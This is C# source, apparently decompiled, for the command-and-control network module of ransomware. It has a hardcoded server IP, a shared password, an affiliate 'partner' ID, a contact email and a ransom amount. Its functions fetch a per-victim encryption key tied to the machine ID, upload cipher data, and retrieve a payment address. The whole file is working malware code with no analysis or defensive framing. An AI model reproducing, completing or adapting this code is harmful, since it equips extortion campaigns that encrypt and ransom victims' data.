using System;
using System.Collections.Specialized;
using System.Net;
using System.Net.Cache;
using System.Security.Cryptography;
using System.Text;

namespace abc;

internal class Network
{
	private static string password = "TretrE4a";

	private static string partner = "abc";

	public static string email = "abchelper@sigaint.org";

	public static string amount = "0.5";

	public static string url = "http://103.208.86.18";

	public static string getKey(int count)
	{
		count++;
		using WebClient webClient = new WebClient();
		try
		{
			webClient.CachePolicy = new RequestCachePolicy(RequestCacheLevel.NoCacheNoStore);
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection["id"] = Form1.getMachineID();
			nameValueCollection["a"] = amount;
			nameValueCollection["_token"] = getToken();
			nameValueCollection["p"] = partner;
			nameValueCollection["hash"] = getHashString(nameValueCollection["id"] + nameValueCollection["a"] + nameValueCollection["p"] + password);
			byte[] bytes = webClient.UploadValues(url + "/key", nameValueCollection);
			return Encoding.Default.GetString(bytes);
		}
		catch (WebException ex)
		{
			Console.WriteLine(ex.Message);
			if (count <= 10)
			{
				return getKey(count);
			}
			return null;
		}
	}

	public static string getHashString(string text)
	{
		byte[] array = MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(text));
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("x2"));
		}
		return stringBuilder.ToString();
	}

	public static string getToken()
	{
		using WebClient webClient = new WebClient();
		try
		{
			webClient.CachePolicy = new RequestCachePolicy(RequestCacheLevel.NoCacheNoStore);
			return webClient.DownloadString(url + "/tkn/" + Form1.getMachineID());
		}
		catch (WebException)
		{
			return null;
		}
	}

	public static string saveCipher(string cipherText, int count)
	{
		count++;
		using WebClient webClient = new WebClient();
		try
		{
			webClient.CachePolicy = new RequestCachePolicy(RequestCacheLevel.NoCacheNoStore);
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection["id"] = Form1.getMachineID();
			nameValueCollection["c"] = cipherText;
			nameValueCollection["_token"] = getToken();
			nameValueCollection["hash"] = getHashString(nameValueCollection["id"] + nameValueCollection["c"] + password);
			byte[] bytes = webClient.UploadValues(url + "/cipher", nameValueCollection);
			return Encoding.Default.GetString(bytes);
		}
		catch (WebException)
		{
			if (count <= 10)
			{
				return saveCipher(cipherText, count);
			}
			return null;
		}
		catch (ArgumentNullException)
		{
			return null;
		}
	}

	public static string getAddress()
	{
		using WebClient webClient = new WebClient();
		webClient.CachePolicy = new RequestCachePolicy(RequestCacheLevel.NoCacheNoStore);
		return webClient.DownloadString(url + "/addr/" + Form1.getMachineID());
	}
}
